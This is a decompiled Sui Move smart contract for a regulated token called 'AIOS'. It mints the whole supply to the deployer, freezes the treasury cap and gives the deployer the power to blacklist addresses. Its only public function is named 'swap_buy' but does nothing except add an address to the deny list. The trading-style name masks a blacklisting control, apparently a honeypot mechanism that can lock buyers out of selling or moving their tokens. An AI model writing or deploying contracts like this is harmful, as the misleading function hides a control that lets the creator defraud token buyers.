module 0x8b4e290b9aac7be5dd15cac6727fe460c67c759f6e9f155942f3d6ab18ff480a::aios {
    struct AIOS has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: AIOS, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<AIOS>(arg0, 9, b"AIOS", b"AI Operating System", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmSiZF71rJBAP75h3DPhVZd6N1UsGkN4gRcm94LeU2VHD1"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<AIOS>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<AIOS>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<AIOS>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<AIOS>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<AIOS>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<AIOS>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

